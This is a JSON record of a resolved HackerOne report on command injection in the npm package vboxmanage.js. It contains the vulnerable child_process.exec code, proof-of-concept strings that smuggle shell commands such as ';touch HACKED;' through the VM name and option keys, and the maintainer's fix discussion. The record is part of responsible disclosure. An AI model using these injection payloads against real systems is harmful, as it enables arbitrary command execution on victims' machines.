{
  "id": 864777,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjQ3Nzc=",
  "url": "https://hackerone.com/reports/864777",
  "title": "[vboxmanage.js] Command Injection via insecure command concatenation",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-02T14:21:33.264Z",
  "submitted_at": "2020-05-02T14:21:33.264Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3lla",
    "url": "/d3lla",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-08-20T09:08:23.411Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-20T09:08:23.322Z",
  "team_member_agreed_on_going_public_at": "2020-08-02T16:49:00.598Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `Command Injection` issue in the `vboxmanage.js` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `vboxmanage.js`\n**version:** `1.0.6`\n**npm page:** `https://www.npmjs.com/package/vboxmanage.js`\n\n## Module Description\n\nA wrapper for VirtualBox CLI with Promises,\n\n## Module Stats\n\n[2] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `start` function.\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76\n...\nvar\n    child_process = require('child_process'),\n...\nVBoxManage.manage = function (command, options) {\n\n    command = command || [];\n    if (!(command instanceof Array)) {\n        command = [command];\n    }\n\n    options = options || {};\n\n    for (var i = 0; i < command.length; i++) {\n        command[i] = escapeArg(command[i]);\n    }\n\n    Object.keys(options).forEach(function (option) {\n\n        command.push('--' + option);\n        var value = options[option];\n\n        if (value !== true) {\n            command.push(escapeArg(value));\n        }\n\n    });\n\n    if (VBoxManage.debug) {\n        console.warn(\"$ VBoxManage \" + command.join(\" \"));\n    }\n\n    return new Promise(function (resolve, reject) {\n\n        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection\n\n            if (err) {\n                err.stderr = stderr;\n                return reject(err);\n            }\n\n            return resolve({ stdout: stdout, stderr: stderr });\n\n        });\n\n    });\n};\n...\nVBoxManage.start = function (vmname, gui, options) {\n    options = options || {};\n    options['type'] = gui ? 'gui' : 'headless';\n    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input\n};\n...\n```\nThe `vmname` parameter is used to build the command that is passed to the `child_process.exec` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `vboxmanage.js` module:\n    -  `npm i vboxmanage.js`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nvar VBox = require('vboxmanage.js');\nVBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F812305}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `vboxmanage.js` module via insecure command concatenation.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 812305,
      "file_name": "poc_vboxmanage.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZkwXwGGboTipaUo4MrbHPpnJ?response-content-disposition=attachment%3B%20filename%3D%22poc_vboxmanage.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_vboxmanage.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072451Z&X-Amz-Expires=1037&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=2332e4b34ed2b192974948fcc2116631f53c5aefd0c8ab25cd1ed20774bb1519",
      "file_size": 829151,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-01T16:49:00.676Z",
  "allow_singular_disclosure_after": -96474951.14997576,
  "singular_disclosure_allowed": true,
  "vote_count": 0,
  "voters": [

  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 7875709,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@nochnoidozor",
      "automated_response": false,
      "created_at": "2020-05-02T22:59:37.621Z",
      "updated_at": "2020-05-02T22:59:37.621Z",
      "actor": {
        "username": "nochnoidozor",
        "cleared": false,
        "verified": false,
        "url": "/nochnoidozor",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 7875716,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@nochnoidozor",
      "automated_response": false,
      "created_at": "2020-05-02T23:02:15.047Z",
      "updated_at": "2020-05-02T23:02:15.047Z",
      "actor": {
        "username": "nochnoidozor",
        "cleared": false,
        "verified": false,
        "url": "/nochnoidozor",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8725830,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2020-07-23T17:33:44.439Z",
      "updated_at": "2020-07-23T17:33:44.439Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8726176,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "https://github.com/danielgindi/node-vboxmanage/commit/fb0ff1f7f668c144777d3c35f1bfc5a61632e2ad\nhttps://github.com/danielgindi/node-vboxmanage/commit/7d420aeb0edc894db304c0cf3e9d79ca024ed049",
      "automated_response": false,
      "created_at": "2020-07-23T17:56:54.149Z",
      "updated_at": "2020-07-23T17:56:54.149Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8727060,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @danielgindi,\n\nthanks for linking the commits for fixing the reported issue.\nI'm wondering, is there a good reason why `child_process.spawn` can not be used instead of the insecure `child_process.exec` variant? We may not be aware of the reasons so I'm interested to learn them.\n\n@d3lla can you confirm that the linked commits prevent and fix the vulnerability?",
      "automated_response": false,
      "created_at": "2020-07-23T18:31:43.781Z",
      "updated_at": "2020-07-23T18:31:43.781Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8733706,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "This is because sometimes you actually need a shell, in case for example that you don’t know the exact path to vboxmamage.\nAlso the exec function can be run as a one-off, while spawn pipes the streams which again is something we have no use for here.\nThere are reasons these two functions exist separately, and all of those reasons are the reasons we use “exec” here :)",
      "automated_response": false,
      "created_at": "2020-07-24T04:07:44.800Z",
      "updated_at": "2020-07-24T04:07:44.800Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8733718,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "By the way, I’ve just seen a vulnerability in this very site. When I reset the pwd, it says “this email is known to us”.\nIt’s dangerous to give any kind of information on whether the account exists or not, as this could narrow down hugely the attack vector.\nIt’s a custom now to just say that an email was sent. If the account does not exist, it was not sent but noone will ever know.",
      "automated_response": false,
      "created_at": "2020-07-24T04:09:49.633Z",
      "updated_at": "2020-07-24T04:09:49.633Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736016,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "> This is because sometimes you actually need a shell, in case for example that you don’t know the exact path to vboxmamage.\n> Also the exec function can be run as a one-off, while spawn pipes the streams which again is something we have no use for here.\n> There are reasons these two functions exist separately, and all of those reasons are the reasons we use “exec” here :)\n\nOk, so execFile and spawn are no options as I understood correctly. Thanks for clarifying this.\n\n> By the way, I’ve just seen a vulnerability in this very site. When I reset the pwd, it says “this email is known to us”.\n\nI can not confirm this, when I do this with my email address and some example one which should not exists I always get a green notification at the top that I will receive an email if there is an account for it (\"If the email address is known to us, we'll send a password recovery link in a few minutes.\").\n\nCan you send me the details via email? Then I can take a look at this, check and verify this, open a report for this if this can be reproduced and invite you to it as reporter to it if you want to.\n\nI will also check this with the HackerOne team.",
      "automated_response": false,
      "created_at": "2020-07-24T06:58:34.607Z",
      "updated_at": "2020-07-24T06:58:34.607Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736049,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I missed the “If” 😂 Sorry!",
      "automated_response": false,
      "created_at": "2020-07-24T07:01:21.143Z",
      "updated_at": "2020-07-24T07:01:21.143Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8736138,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@danielgindi ah ok, so there is no problem with the password reset / forgot feature? Good to know and thanks for keeping an eye on this and clarifying this. The message should be probably displayed for a longer time.",
      "automated_response": false,
      "created_at": "2020-07-24T07:10:15.116Z",
      "updated_at": "2020-07-24T07:10:15.116Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8757954,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi everybody,\n@danielgindi thank you for your explanation and for the fix.\nI run the previous poc:\n```javascript\nvar VBox = require('vboxmanage.js');\nVBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});\n\n```\nand I was not able to reproduce the previous reported result.\n\n\nHowever, I found a corner case (very unlikely) where it is still possible to inject commands.\nIf an attacker can control also the option parameters he/she can still inject commands.\n\nHere is the poc2.js used:\n```javascript\nconst VBox = require('vboxmanage.js');\n\nconst options =  JSON.parse('{\"`touch HACKED2`\" : \"\"}');\n\nVBox.start(';touch HACKED1;', 'gui', options).then(function () {}).catch(function (err) {});\n\n```\n\nI attached a video.\n{F923993}\n\nIn this case the option's keys are not sanitized:\n```javascript\n// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L57\n...\nVBoxManage.manage = function (command, options) {\n\n    command = command || [];\n    if (!Array.isArray(command)) {\n        command =  /**@type string[]*/[command];\n    }\n\n    options = options || {};\n\n    for (let i = 0; i < command.length; i++) {\n        command[i] = escapeArg(command[i]);\n    }\n\n    for (const [option, value] of Object.entries(options)) {\n        command.push('--' + option); //<-- HERE\n\n        if (value !== true) {\n            command.push(escapeArg(value));\n        }\n    }\n\n    if (VBoxManage.debug) {\n        console.warn(\"$ VBoxManage \" + command.join(\" \"));\n    }\n\n    return new Promise((resolve, reject) => {\n        ChildProcess.exec(vBoxManageBinary + ' ' + command.join(' '), {}, (err, stdout, stderr) => {\n            if (err) {\n                err.stderr = stderr;\n                return reject(err);\n            }\n\n            return resolve({stdout: stdout, stderr: stderr});\n        });\n    });\n    ...\n```\n\n@danielgindi  and @danielruf  please let me know what do you think about that.\n\n\nThank you for your time,\nd3lla\n\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n",
      "automated_response": false,
      "created_at": "2020-07-26T17:19:53.368Z",
      "updated_at": "2020-07-26T17:19:53.368Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 923993,
          "filename": "poc2_vboxmanage.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2kzcHarVBiG3MoP8LgyUhUkP?response-content-disposition=attachment%3B%20filename%3D%22poc2_vboxmanage.mov%22%3B%20filename%2A%3DUTF-8%27%27poc2_vboxmanage.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072451Z&X-Amz-Expires=1037&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=1d2bdd007ea335eaa224b2f2a32a3f9292083569fa2e6b944ba86c3b6f60c3bc"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8758336,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I think in this case it's totally the fault of the developer using this, but we can sanitize that too for sure ;-)",
      "automated_response": false,
      "created_at": "2020-07-26T17:36:11.916Z",
      "updated_at": "2020-07-26T17:36:11.916Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8760631,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "https://github.com/danielgindi/node-vboxmanage/commit/8efe421dd19c474cbdeb0908cbcc7aabfe343d5e",
      "automated_response": false,
      "created_at": "2020-07-27T06:05:26.804Z",
      "updated_at": "2020-07-27T06:05:26.804Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8799479,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @danielgindi, that looks good.\nCan you confirm that this resolves the second problem @d3lla?",
      "automated_response": false,
      "created_at": "2020-07-29T21:51:26.743Z",
      "updated_at": "2020-07-29T21:51:26.743Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8829318,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @danielgindi and @danielruf,\nthanks for your reply and for the fix.\n\nI run the previous poc:\n```javascript\nconst VBox = require('vboxmanage.js');\n\nconst options =  JSON.parse('{\"`touch HACKED2`\" : \"\"}');\n\nVBox.start(';touch HACKED3;').then(function () {}).catch(function (err) {});\nVBox.start(';touch HACKED1;', 'gui', options).then(function () {}).catch(function (err) {});\n\n```\nand I was not able to reproduce the previous reported results.\n\nThanks for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n",
      "automated_response": false,
      "created_at": "2020-08-02T15:34:38.289Z",
      "updated_at": "2020-08-02T15:34:38.289Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8829537,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thanks for the feedback.\nI think we can close this as resolved and disclose this report.",
      "automated_response": false,
      "created_at": "2020-08-02T16:48:48.000Z",
      "updated_at": "2020-08-02T16:48:48.000Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "d3lla",
        "url": "/d3lla"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8829538,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-02T16:49:00.622Z",
      "updated_at": "2020-08-02T16:49:00.622Z",
      "first_to_agree": true,
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8829609,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I've deprecated older versions. I don't see here any option to approve disclosure.",
      "automated_response": false,
      "created_at": "2020-08-02T17:09:11.056Z",
      "updated_at": "2020-08-02T17:09:11.056Z",
      "actor": {
        "username": "danielgindi",
        "cleared": false,
        "verified": false,
        "url": "/danielgindi",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8830266,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "As far as I know @d3lla has to accept the disclosure but I can also force the disclosure if needed.",
      "automated_response": false,
      "created_at": "2020-08-02T21:12:30.550Z",
      "updated_at": "2020-08-02T21:12:30.550Z",
      "actor": {
        "username": "danielruf",
        "cleared": false,
        "verified": false,
        "url": "/danielruf",
